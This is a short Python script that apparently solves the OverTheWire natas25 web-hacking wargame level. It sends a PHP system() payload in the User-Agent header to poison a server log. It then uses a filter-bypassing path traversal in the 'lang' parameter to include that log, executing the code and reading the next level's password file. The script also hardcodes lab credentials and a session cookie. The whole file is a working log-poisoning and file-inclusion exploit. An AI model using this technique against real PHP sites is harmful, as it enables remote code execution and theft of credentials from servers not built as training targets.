#!/usr/bin/python

import requests

auth = ("natas25", "GHF6X7YwACaYYssHVY05cFq83hRktl4c")

cookie = {'PHPSESSID' : '76ma8cguk08hc3isgjqgavdgt7'}

url = "http://natas25.natas.labs.overthewire.org/"

headers = {'User-Agent' : "<?php system(\"cat /etc/natas_webpass/natas26\"); ?>"}

params = {'lang' : "..././logs/natas25_" + cookie['PHPSESSID'] + ".log"}

req = requests.get(url, auth = auth, cookies = cookie, params = params, headers = headers)

print req.text

